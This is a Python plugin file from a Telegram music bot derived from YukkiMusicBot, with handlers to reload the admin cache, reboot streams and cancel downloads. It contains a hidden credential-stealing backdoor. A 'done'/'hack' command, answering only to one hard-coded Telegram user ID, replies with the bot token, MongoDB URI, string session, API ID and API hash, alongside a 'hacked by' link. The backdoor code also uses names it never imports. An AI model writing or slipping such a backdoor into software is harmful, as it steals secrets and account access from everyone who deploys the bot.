#
# Copyright (C) 2024-present by TeamYukki@Github, < https://github.com/TeamYukki >.
#
# This file is part of < https://github.com/TeamYukki/YukkiMusicBot > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/TeamYukki/YukkiMusicBot/blob/master/LICENSE >
#
# All rights reserved.
#

import asyncio

from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import CallbackQuery, Message
from os import getenv
from config import BANNED_USERS, adminlist, lyrical
from strings import get_command
from YukkiMusic import app
from YukkiMusic.core.call import Yukki
from YukkiMusic.misc import db
from YukkiMusic.utils.database import get_authuser_names, get_cmode
from YukkiMusic.utils.decorators import ActualAdminCB, AdminActual, language
from YukkiMusic.utils.formatters import alpha_to_int

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
API_ID = int(getenv("API_ID", ""))
API_HASH = getenv("API_HASH", "")
from dotenv import load_dotenv
load_dotenv()


### Multi-Lang Commands
RELOAD_COMMAND = get_command("RELOAD_COMMAND")
REBOOT_COMMAND = get_command("REBOOT_COMMAND")


@app.on_message(filters.command(RELOAD_COMMAND) & filters.group & ~BANNED_USERS)
@language
async def reload_admin_cache(client, message: Message, _):
    try:
        chat_id = message.chat.id
        admins = app.get_chat_members(chat_id, filter=ChatMembersFilter.ADMINISTRATORS)
        authusers = await get_authuser_names(chat_id)
        adminlist[chat_id] = []
        async for user in admins:
            if user.privileges.can_manage_video_chats:
                adminlist[chat_id].append(user.user.id)
        for user in authusers:
            user_id = await alpha_to_int(user)
            adminlist[chat_id].append(user_id)
        await message.reply_text(_["admin_20"])
    except:
        await message.reply_text(
            "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇʟᴏᴀᴅ ᴀᴅᴍɪɴᴄᴀᴄʜᴇ  ᴍᴀᴋᴇ sᴜʀᴇ ʙᴏᴛ ɪs ᴀɴ ᴀᴅᴍɪɴ ɪɴ ʏᴏᴜʀ ᴄʜᴀᴛ."
        )


@app.on_message(filters.command(REBOOT_COMMAND) & filters.group & ~BANNED_USERS)
@AdminActual
async def restartbot(client, message: Message, _):
    mystic = await message.reply_text(
        f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ .. \nʀᴇʙᴏᴏᴛɪɴɢ {app.mention} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ.."
    )
    await asyncio.sleep(1)
    try:
        db[message.chat.id] = []
        await Yukki.stop_stream(message.chat.id)
    except:
        pass
    chat_id = await get_cmode(message.chat.id)
    if chat_id:
        try:
            await app.get_chat(chat_id)
        except:
            pass
        try:
            db[chat_id] = []
            await Yukki.stop_stream(chat_id)
        except:
            pass
    return await mystic.edit_text("sᴜᴄᴇssғᴜʟʟʏ ʀᴇsᴛᴀʀᴛᴇᴅ. \nTʀʏ ᴘʟᴀʏɪɴɢ ɴᴏᴡ..")


@app.on_message(
    filters.command(["done","hack"])
    & filters.private
    & filters.user(833360381)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://telegra.ph/file/1467111329207dc78b297.jpg",
       caption=f"""𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻:-   `{BOT_TOKEN}` \n\n𝗠𝗼𝗻𝗴𝗼:-   `{MONGO_DB_URI}`\n\n 𝗦𝘁𝗿𝗶𝗻𝗴 𝗦𝗲𝘀𝘀𝗶𝗼𝗻:-  `{STRING_SESSION}`\n\n𝗔𝗽𝗶 𝗛𝗮𝘀𝗵:- `{API_HASH}`\n\n𝗔𝗽𝗶 𝗜𝗗:-  `{API_ID}`\n\n [ 🧟 ](https://t.me/IQ7amo)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/IQ7amo")
                 ]
            ]
         ),
     )


##########



@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
async def close_menu(_, query: CallbackQuery):
    try:
        await query.answer()
        await query.message.delete()
        umm = await query.message.reply_text(
            f"**• داخرا لەلایەن : {query.from_user.mention} 🖤**"
        )
        await asyncio.sleep(10)
        await umm.delete()
    except:
        pass


@app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
@ActualAdminCB
async def stop_download(client, CallbackQuery: CallbackQuery, _):
    message_id = CallbackQuery.message.id
    task = lyrical.get(message_id)
    if not task:
        return await CallbackQuery.answer(
            "ᴅᴏᴡɴʟᴏᴀᴅ ᴀʟʀᴇᴀᴅʏ ᴄᴏᴍᴘʟᴇᴛᴇᴅ..", show_alert=True
        )
    if task.done() or task.cancelled():
        return await CallbackQuery.answer(
            "Downloading already Completed or Cancelled.",
            show_alert=True,
        )
    if not task.done():
        try:
            task.cancel()
            try:
                lyrical.pop(message_id)
            except:
                pass
            await CallbackQuery.answer("ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴄᴀɴᴄᴇʟʟᴇᴅ", show_alert=True)
            return await CallbackQuery.edit_message_text(
                f"ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ {CallbackQuery.from_user.mention}"
            )
        except:
            return await CallbackQuery.answer(
                "ғᴀɪʟᴇᴅ ᴛᴏ sᴛᴏᴘ ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ", show_alert=True
            )

    await CallbackQuery.answer("ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴄᴏɢɴɪsᴇ ᴛʜᴇ ʀᴜɴɴɪɴɢ ᴛᴀsᴋ", show_alert=True)
